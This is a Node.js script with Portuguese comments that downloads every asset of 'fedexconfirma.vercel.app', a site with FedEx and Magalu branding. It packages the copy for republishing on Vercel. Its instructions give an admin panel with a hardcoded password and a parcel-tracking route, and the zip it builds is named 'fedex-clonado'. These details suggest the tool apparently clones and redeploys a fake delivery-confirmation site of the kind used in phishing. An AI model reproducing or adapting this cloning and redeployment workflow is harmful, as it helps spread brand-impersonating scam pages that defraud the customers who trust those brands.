const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');

console.log("========================================");
console.log("   DOWNLOADER DO SITE FEDEX CONFIRMA");
console.log("========================================\n");

console.log("📁 Criando pastas...");

// Criar pastas manualmente (mais seguro)
try {
    if (!fs.existsSync('static')) fs.mkdirSync('static');
    console.log("   ✅ Pasta 'static' criada");
    
    if (!fs.existsSync('static/css')) fs.mkdirSync('static/css');
    console.log("   ✅ Pasta 'static/css' criada");
    
    if (!fs.existsSync('static/js')) fs.mkdirSync('static/js');
    console.log("   ✅ Pasta 'static/js' criada");
} catch (err) {
    console.log("   ❌ Erro ao criar pastas: " + err.message);
}
console.log("");

// Lista de arquivos para baixar
const arquivos = [
    { url: 'https://fedexconfirma.vercel.app', nome: 'index.html', pasta: '' },
    { url: 'https://fedexconfirma.vercel.app/static/css/main.279a0c67.css', nome: 'main.279a0c67.css', pasta: 'static/css' },
    { url: 'https://fedexconfirma.vercel.app/static/js/main.9dcfcc1e.js', nome: 'main.9dcfcc1e.js', pasta: 'static/js' },
    { url: 'https://fedexconfirma.vercel.app/fedex.png', nome: 'fedex.png', pasta: '' },
    { url: 'https://fedexconfirma.vercel.app/logo-magalu-azul%20(1).png', nome: 'logo-magalu-azul (1).png', pasta: '' },
    { url: 'https://fedexconfirma.vercel.app/bannerfedex.png', nome: 'bannerfedex.png', pasta: '' },
    { url: 'https://fedexconfirma.vercel.app/BANNERMAGALU.png', nome: 'BANNERMAGALU.png', pasta: '' },
    { url: 'https://fedexconfirma.vercel.app/bannerfedex2.png', nome: 'bannerfedex2.png', pasta: '' }
];

console.log(`📥 Iniciando download de ${arquivos.length} arquivos...\n`);

// Função para baixar arquivo
function baixarArquivo(url, destino, callback) {
    const file = fs.createWriteStream(destino);
    
    https.get(url, (response) => {
        if (response.statusCode === 200) {
            response.pipe(file);
            file.on('finish', () => {
                file.close();
                callback(true);
            });
        } else {
            callback(false, `Status: ${response.statusCode}`);
        }
    }).on('error', (err) => {
        fs.unlink(destino, () => {});
        callback(false, err.message);
    });
}

// Baixar um por um
let contador = 0;
let sucessos = 0;
let falhas = 0;

function baixarProximo() {
    if (contador >= arquivos.length) {
        console.log(`\n✅ Download concluído!`);
        console.log(`   📥 Sucessos: ${sucessos}`);
        console.log(`   ❌ Falhas: ${falhas}`);
        console.log("");
        
        // Criar vercel.json
        const vercelConfig = {
            rewrites: [{ source: "/(.*)", destination: "/index.html" }]
        };
        fs.writeFileSync('vercel.json', JSON.stringify(vercelConfig, null, 2));
        console.log("📄 Arquivo 'vercel.json' criado");
        
        // Criar testar.bat
        const batContent = `@echo off
echo ================================
echo   TESTANDO SITE LOCALMENTE
echo ================================
echo.
echo Abrindo servidor local...
echo.
echo Pressione CTRL+C para parar o servidor
echo.
python -m http.server 8000
pause`;
        fs.writeFileSync('testar.bat', batContent);
        console.log("📄 Arquivo 'testar.bat' criado (para testar localmente)");
        
        // Instruções
        const instrucoes = `INSTRUÇÕES RÁPIDAS
==================

✅ PARA TESTAR LOCALMENTE:
   - Dê duplo clique em "testar.bat"
   - Abra o navegador em: http://localhost:8000

🌐 PARA PUBLICAR NA VERCELL:
   - Acesse: https://vercel.com
   - Crie conta (grátis)
   - Arraste esta pasta para o site

🔗 LINKS IMPORTANTES:
   - Admin: /admin (senha: GT@5513)
   - Rastreamento: /rastreamento/CODIGO
`;
        fs.writeFileSync('INSTRUCOES.txt', instrucoes);
        console.log("📄 Arquivo 'INSTRUCOES.txt' criado");
        
        // Tentar criar ZIP
        console.log("\n📦 Criando arquivo ZIP...");
        const zipNome = `fedex-clonado-${Date.now()}.zip`;
        
        // Verificar se tem PowerShell
        const comando = `powershell Compress-Archive -Path * -DestinationPath ${zipNome} -Force`;
        
        exec(comando, (error) => {
            if (error) {
                console.log("   ⚠️ Não foi possível criar ZIP automático");
                console.log("   📁 Os arquivos estão na pasta atual");
            } else {
                console.log(`   ✅ ZIP criado: ${zipNome}`);
            }
            console.log("\n✅ Processo finalizado! Pode fechar esta janela.");
        });
        
        return;
    }
    
    const arquivo = arquivos[contador];
    const destino = arquivo.pasta ? `${arquivo.pasta}/${arquivo.nome}` : arquivo.nome;
    
    process.stdout.write(`   [${contador+1}/${arquivos.length}] ${arquivo.nome}... `);
    
    baixarArquivo(arquivo.url, destino, (sucesso, erro) => {
        if (sucesso) {
            console.log(`✅`);
            sucessos++;
        } else {
            console.log(`❌ (${erro})`);
            falhas++;
        }
        
        contador++;
        baixarProximo();
    });
}

// Começar
baixarProximo();